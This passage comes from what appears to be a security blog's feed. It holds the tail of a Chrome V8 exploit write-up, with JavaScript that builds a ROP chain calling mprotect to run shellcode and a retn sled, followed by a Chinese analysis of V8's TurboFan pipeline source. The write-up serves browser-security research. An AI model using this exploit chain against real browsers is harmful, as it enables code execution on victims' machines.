class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">let</span> nop = bin_base+<span class="number">0x263d061n</span>;</span><br><span class="line">  <span class="keyword">let</span> pop_rdi = bin_base+<span class="number">0x264bdccn</span>;</span><br><span class="line">  <span class="keyword">let</span> pop_rsi = bin_base+<span class="number">0x267e82en</span>;</span><br><span class="line">  <span class="keyword">let</span> pop_rdx = bin_base+<span class="number">0x26a8d66n</span>;</span><br><span class="line">  <span class="keyword">let</span> mprotect = bin_base+<span class="number">0x88278f0n</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> sc_array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">    sc_array[i] = sc[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> sc_addr = readq((leak_ptr(sc_array)<span class="number">-1n</span>+<span class="number">0x68n</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`sc_addr: <span class="subst">$&#123;sc_addr.hex()&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> rop = [</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">4096n</span>,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">7n</span>,</span><br><span class="line">    mprotect,</span><br><span class="line">    sc_addr</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">let</span> rop_start = stack_ptr - <span class="number">8n</span>*BigInt(rop.length);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">    writeq(rop_start+<span class="number">8n</span>*BigInt(i), rop[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">    rop_start -= <span class="number">8n</span>;</span><br><span class="line">    writeq(rop_start, nop);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The addresses in red rectangle is environment variable, and the contents in yellow rectangle are <code>0x200*retn</code>, <strong>variable <code>nop</code> here represents <code>retn</code> instruction but not 0x90</strong>(<code>nop</code> instruction), we the code executes <code>retn</code>，it will keep returning until executing our ROP。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">  rop_start -= <span class="number">8n</span>;</span><br><span class="line">  writeq(rop_start, nop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090853.png" alt=""></p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;chrome</span><br><span class="line">.&#x2F;chrome index.html</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091400.jpg" alt=""></p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h3><p>I would acknowledge stephen(@_tsuro) who guides me and points out my stupid mistakes.<br>Debugging d8 is quite different from chrome，when leaking cxa，it will map builtin to a random address，and cxa is mapped to libv8.so，so we cannot find offset via cxa.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091930.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091917.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091900.png" alt=""><br>When you complete a arbitrary r/w primitive in v8，you can exploit chrome via the script without additional debug（yes, u don’t need to debug a full chrome)</p><p>Thanks Auxy(@realAuxy233) for translating~<br>If you find any errors or corrections, contact me. </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/google/google-
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 pipeline</title>
    <link href="http://eternalsakura13.com/2018/09/05/pipeline/"/>
    <id>http://eternalsakura13.com/2018/09/05/pipeline/</id>
    <published>2018-09-05T03:33:05.350Z</published>
    <updated>2018-10-22T14:25:51.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v8::internal::GeneratedCode</span><br><span class="line">    -&gt; RUNTIME_FUNCTION(Runtime_CompileOptimized_NotConcurrent)</span><br><span class="line">        -&gt; Compiler::CompileOptimized</span><br><span class="line">            -&gt; GetOptimizedCode</span><br><span class="line">                -&gt; GetOptimizedCodeNow</span><br><span class="line">                    -&gt; OptimizedCompilationJob::PrepareJob</span><br><span class="line">                        -&gt; PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</span><br><span class="line">                            -&gt; PipelineImpl::CreateGraph()</span><br><span class="line">                                -&gt; BytecodeGraphBuilder::CreateGraph()</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; SetStart</span><br><span class="line">                                    -&gt; NewNodeUnchecked</span><br><span class="line">                                      -&gt; Node::New</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; env</span><br><span class="line">                                  -&gt; VisitBytecodes</span><br></pre></td></tr></table></figure><h3 id="Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent"><a href="#Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent" class="headerlink" title="Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)"></a>Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)</h3><p>参数1是要compile的function，参数2是一个标志,应该是和线程相关，表示function不在“正在编译的函数的队列”里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (mode &#x3D;&#x3D; ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">  if (GetOptimizedCodeLater(job.get(), isolate)) &#123;</span><br><span class="line">    job.release();  &#x2F;&#x2F; The background recompile job owns this now.</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set the optimization marker and return a code object which checks it.</span><br><span class="line">    function-&gt;SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);</span><br><span class="line">    DCHECK(function-&gt;IsInterpreted() ||</span><br><span class="line">           (!function-&gt;is_compiled() &amp;&amp; function-&gt;shared()-&gt;IsInterpreted()));</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;HasBytecodeArray());</span><br><span class="line">    return BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在这个函数中进行编译，这个函数首先检查function是否已经被编译过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (function-&gt;IsOptimized()) return true;</span><br></pre></td></tr></table></figure><p>然后进行编译优化，如果编译优化成功则以后在js中调用函数都执行编译后的code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!GetOptimizedCode(function, mode).ToHandle(&amp;code)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#x2F;&#x2F; Install code on closure.</span><br><span class="line">function-&gt;set_code(*code);</span><br></pre></td></tr></table></figure><p>如果失败，则回到解释帧InterpreterEntryTrampoline执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code &#x3D; BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br></pre></td></tr></table></figure><h3 id="bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate"><a href="#bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate" class="headerlink" title="bool GetOptimizedCodeNow(OptimizedCompilationJob* job, Isolate* isolate)"></a>bool GetOptimizedCodeNow(OptimizedCompilationJob* job, Isolate* isolate)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (job-&gt;PrepareJob(isolate) != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;ExecuteJob() != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;FinalizeJob(isolate) != CompilationJob::SUCCEEDED) &#123;</span><br></pre></td></tr></table></figure><h3 id="CompilationJob-Status-OptimizedCompilationJob-PrepareJob"><a href="#CompilationJob-Status-OptimizedCompilationJob-PrepareJob" class="headerlink" title="CompilationJob::Status OptimizedCompilationJob::PrepareJob"></a>CompilationJob::Status OptimizedCompilationJob::PrepareJob</h3><p>v8里有非常多的status，很有意思。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_BOOL(trace_opt, <span class="literal">false</span>, <span class="string">"trace lazy optimization"</span>)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (FLAG_trace_opt &amp;&amp; compilation_info()-&gt;IsOptimizing()) &#123;</span><br><span class="line">    <span class="function">OFStream <span class="title">os</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"[compiling method "</span> &lt;&lt; Brief(*compilation_info()-&gt;closure())</span><br><span class="line">       &lt;&lt; <span class="string">" using "</span> &lt;&lt; compiler_name_;</span><br><span class="line">    <span class="keyword">if</span> (compilation_info()-&gt;is_osr()) os &lt;&lt; <span class="string">" OSR"</span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"]"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个函数就是调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return UpdateState(PrepareJobImpl(isolate), State::kReadyToExecute);</span><br></pre></td></tr></table></figure><h3 id="PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl"><a href="#PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl" class="headerlink" title="PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl"></a>PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</h3><p>前面根据一些标志位进行设置，包括下面这些等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; OptimizedCompilationInfo encapsulates the information needed to compile</span><br><span class="line">&#x2F;&#x2F; optimized code for a given function, and the results of the optimized</span><br><span class="line">&#x2F;&#x2F; compilation.</span><br><span class="line">class V8_EXPORT_PRIVATE OptimizedCompilationInfo final &#123;</span><br><span class="line"> public:</span><br><span class="line">  &#x2F;&#x2F; Various configuration flags for a compilation, as well as some properties</span><br><span class="line">  &#x2F;&#x2F; of the compiled code produced by a compilation.</span><br><span class="line">  enum Flag &#123;</span><br><span class="line">    kAccessorInliningEnabled &#x3D; 1 &lt;&lt; 0,</span><br><span class="line">    kFunctionContextSpecializing &#x3D; 1 &lt;&lt; 1,</span><br><span class="line">    kInliningEnabled &#x3D; 1 &lt;&lt; 2,</span><br><span class="line">    kDisableFutureOptimization &#x3D; 1 &lt;&lt; 3,</span><br><span class="line">    kSplittingEnabled &#x3D; 1 &lt;&lt; 4,</span><br><span class="line">    kSourcePositionsEnabled &#x3D; 1 &lt;&lt; 5,</span><br><span class="line">    kBailoutOnUninitialized &#x3D; 1 &lt;&lt; 6,</span><br><span class="line">    kLoopPeelingEnabled &#x3D; 1 &lt;&lt; 7,</span><br><span class="line">    kUntrustedCodeMitigations &#x3D; 1 &lt;&lt; 8,</span><br><span class="line">    kSwitchJumpTableEnabled &#x3D; 1 &lt;&lt; 9,</span><br><span class="line">    kCalledWithCodeStartRegister &#x3D; 1 &lt;&lt; 10,</span><br><span class="line">    kPoisonRegisterArguments &#x3D; 1 &lt;&lt; 11,</span><br><span class="line">    kAllocationFoldingEnabled &#x3D; 1 &lt;&lt; 12,</span><br><span class="line">    kAnalyzeEnvironmentLiveness &#x3D; 1 &lt;&lt; 13,</span><br><span class="line">    kTraceTurboJson &#x3D; 1 &lt;&lt; 14,</span><br><span class="line">    kTraceTurboGraph &#x3D; 1 &lt;&lt; 15,</span><br><span class="line">    kTraceTurboScheduled &#x3D; 1 &lt;&lt; 16,</span><br><span class="line">  &#125;;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">FLAG_always_opt</span><br><span class="line">FLAG_turbo_loop_peeling</span><br><span class="line">FLAG_turbo_inlining</span><br><span class="line">FLAG_inline_accessors</span><br><span class="line">FLAG_turbo_allocation_folding</span><br></pre></td></tr></table></figure><p>然后开始创建Graph</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pipeline_.CreateGraph()) &#123;</span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;has_pending_exception()) <span class="keyword">return</span> FAILED;  <span class="comment">// Stack overflowed.</span></span><br><span class="line">  <span class="keyword">return</span> AbortOptimization(BailoutReason::kGraphBuildingFailed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PipelineImpl-CreateGraph"><a href="#PipelineImpl-CreateGraph" class="headerlink" title="PipelineImpl::CreateGraph()"></a>PipelineImpl::CreateGraph()</h3><p>检查trace标志位并做相应操作,主要是做记录。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled() ||</span><br><span class="line">    info()-&gt;trace_turbo_graph_enabled()) &#123;</span><br></pre></td></tr></table></figure><p>通过添加修饰器来记录源码位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-&gt;source_positions()-&gt;AddDecorator();</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Initial untyped"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform function context specialization and inlining (if enabled).</span></span><br><span class="line">  Run&lt;InliningPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Inlined"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove dead-&gt;live edges from the graph.</span></span><br><span class="line">  Run&lt;EarlyGraphTrimmingPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Early trimmed"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Determine the Typer operation flags.</span></span><br><span class="line">    Typer::Flags flags = Typer::kNoFlags;</span><br><span class="line">    <span class="keyword">if</span> (is_sloppy(info()-&gt;shared_info()-&gt;language_mode()) &amp;&amp;</span><br><span class="line">        info()-&gt;shared_info()-&gt;IsUserJavaScript()) &#123;</span><br><span class="line">      <span class="comment">// Sloppy mode functions always have an Object for this.</span></span><br><span class="line">      flags |= Typer::kThisIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IsClassConstructor(info()-&gt;shared_info()-&gt;kind())) &#123;</span><br><span class="line">      <span class="comment">// Class constructors cannot be [[Call]]ed.</span></span><br><span class="line">      flags |= Typer::kNewTargetIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    <span class="function">Typer <span class="title">typer</span><span class="params">(isolate(), flags, data-&gt;graph())</span></span>;</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Typed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Lower JSOperators where we can determine types.</span></span><br><span class="line">    Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Lowered typed"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do some hacky things to prepare for the optimization phase.</span></span><br><span class="line">  <span class="comment">// (caching handles, etc.).</span></span><br><span class="line">  Run&lt;ConcurrentOptimizationPrepPhase&gt;();</span><br><span class="line"></span><br><span class="line">  data-&gt;EndPhaseKind();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BytecodeGraphBuilder-CreateGraph"><a href="#BytecodeGraphBuilder-CreateGraph" class="headerlink" title="BytecodeGraphBuilder::CreateGraph()"></a>BytecodeGraphBuilder::CreateGraph()</h3><p>设置图的基本结构。<br>{Start}的输出是形参（包括receiver）加上new target, arguments数目,context和closure</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> actual_parameter_count = bytecode_array()-&gt;parameter_count() + <span class="number">4</span>;</span><br><span class="line">graph()-&gt;SetStart(graph()-&gt;NewNode(common()-&gt;Start(actual_parameter_count)));</span><br></pre></td></tr></table></figure><p>NewNode是用于创建新node的帮助函数。<br>common()返回CommonOperatorBuilder*的common_,差不多是一个op的集合了，然后从中选择Start</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> common_; &#125;</span><br><span class="line">  ...</span><br><span class="line">    <span class="function"><span class="keyword">const</span> Operator* <span class="title">Start</span><span class="params">(<span class="keyword">int</span> value_output_count)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">const</span> Operator* <span class="title">CommonOperatorBuilder::Start</span><span class="params">(<span class="keyword">int</span> value_output_count)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator(                                    <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kStart, Operator::kFoldable | Operator::kNoThrow,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Start"</span>,                                                     <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, value_output_count, <span class="number">1</span>, <span class="number">1</span>);                          <span class="comment">// counts</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这个文件还是比较有用的，common-operator.cc，因为NewNode的opcode参数从这里初始化。</strong><br>回到NewNode看一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Factory template for nodes with static input counts.</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span>... Nodes&gt;</span><br><span class="line">  <span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> NewNode(op, nodes_arr.<span class="built_in">size</span>(), nodes_arr.data());</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"> <span class="function">Node* <span class="title">Graph::NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count, Node* <span class="keyword">const</span>* inputs,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">bool</span> incomplete)</span> </span>&#123;</span><br><span class="line">  Node* node = NewNodeUnchecked(op, input_count, inputs, incomplete);</span><br><span class="line">  Verifier::VerifyNode(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function">Node* <span class="title">Graph::NewNodeUnchecked</span><span class="params">(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                              Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> incomplete)</span> </span>&#123;</span><br><span class="line">  Node* <span class="keyword">const</span> node =</span><br><span class="line">      Node::New(zone(), NextNodeId(), op, input_count, inputs, incomplete);</span><br><span class="line">  Decorate(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是执行到了这里,于是我们来分析一下这个函数。</p><h4 id="Node-New"><a href="#Node-New" class="headerlink" title="Node::New"></a>Node::New</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">Node::New</span><span class="params">(Zone* zone, NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> has_extensible_inputs)</span> </span>&#123;</span><br><span class="line">  Node** input_ptr;</span><br><span class="line">  Use* use_ptr;</span><br><span class="line">  Node* node;</span><br><span class="line">  <span class="keyword">bool</span> is_inline;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_count &gt; kMaxInlineCapacity) &#123;</span><br><span class="line">    <span class="comment">// Allocate out-of-line inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity =</span><br><span class="line">        has_extensible_inputs ? input_count + kMaxInlineCapacity : input_count;</span><br><span class="line">    OutOfLineInputs* outline = OutOfLineInputs::New(zone, capacity);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate node.</span></span><br><span class="line">    <span class="keyword">void</span>* node_buffer = zone-&gt;New(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, kOutlineMarker, <span class="number">0</span>);</span><br><span class="line">    node-&gt;inputs_.outline_ = outline;</span><br><span class="line"></span><br><span class="line">    outline-&gt;node_ = node;</span><br><span class="line">    outline-&gt;count_ = input_count;</span><br><span class="line"></span><br><span class="line">    input_ptr = outline-&gt;inputs_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(outline);</span><br><span class="line">    is_inline = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Allocate node with inline inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> <span class="built_in">max</span> = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::<span class="built_in">min</span>(input_count + <span class="number">3</span>, <span class="built_in">max</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line">    <span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(<span class="built_in">size</span>));</span><br><span class="line">    <span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span 